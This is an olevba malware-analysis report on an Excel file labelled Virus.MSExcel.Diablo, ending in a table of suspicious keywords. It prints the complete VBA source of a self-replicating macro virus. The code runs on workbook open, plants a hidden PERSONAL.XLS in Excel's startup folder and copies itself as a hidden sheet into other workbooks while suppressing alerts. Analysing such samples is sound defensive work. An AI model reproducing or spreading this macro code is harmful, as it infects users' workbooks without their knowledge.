olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet111.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet131.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet131'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1311.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1311'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13111.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13112.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13112'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13113.cls 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13113'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Diablos.bas 
in file: Virus.MSExcel.Diablo-550aad3d9489efce5be59ff4d66a9882d64a998b - OLE stream: '_VBA_PROJECT_CUR/VBA/Diablos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



' Diablos Macro
' Bios Virus Macro - (C) Copyright 1998/1999 - Spalaci

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo ErrorHandler1
    MkDir (Application.StartupPath)
    On Error GoTo 0
    GoTo ErrorHandler1
ErrorHandler1:
Application.OnSheetActivate = "Clonar"
End Sub

Sub Clonar()
Attribute Clonar.VB_ProcData.VB_Invoke_Func = " \n14"
 On Error GoTo ErrorHandler2
 Application.ScreenUpdating = False
 Application.DisplayAlerts = False

install = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
   If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then install = 1
   If install = 1 Then
      GoTo ErrorHandler2
   Else
      Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\PERSONAL.XLS"
      Workbooks(ThisWorkbook.Name).Sheets("Diablos").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
      Workbooks("PERSONAL.XLS").Sheets("Diablos").Visible = False
      Workbooks("PERSONAL.XLS").Save
      Windows("PERSONAL.XLS").Visible = False
   End If
Else
   Windows("PERSONAL.XLS").Visible = False
   For i = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
       If Workbooks(ActiveWorkbook.Name).Sheets(i).Name = "Diablos" Then install = 1
   Next
   If install = 1 Then
      GoTo ErrorHandler2
   Else
      Workbooks("PERSONAL.XLS").Sheets("Diablos").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
      Workbooks(ActiveWorkbook.Name).Sheets("Diablos").Visible = False
      Workbooks(ActiveWorkbook.Name).Save
      Windows("PERSONAL.XLS").Visible = False
   End If
End If
 Workbooks("PERSONAL.XLS").Save
 Application.ScreenUpdating = True
 Application.DisplayAlerts = True
 If Day(Now()) = Int((31 * Rnd) + 1) Then CommandBars.LargeButtons = True
ErrorHandler2:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Diablo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ðÅ
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 
Í
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8»T
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 1 ÔÆ
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 2 ÔÆ
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 2 ÔÆÂ…Ç
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 2 ÔÆÂ…Ç
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 3 Ô
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 4 ÔÆ
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

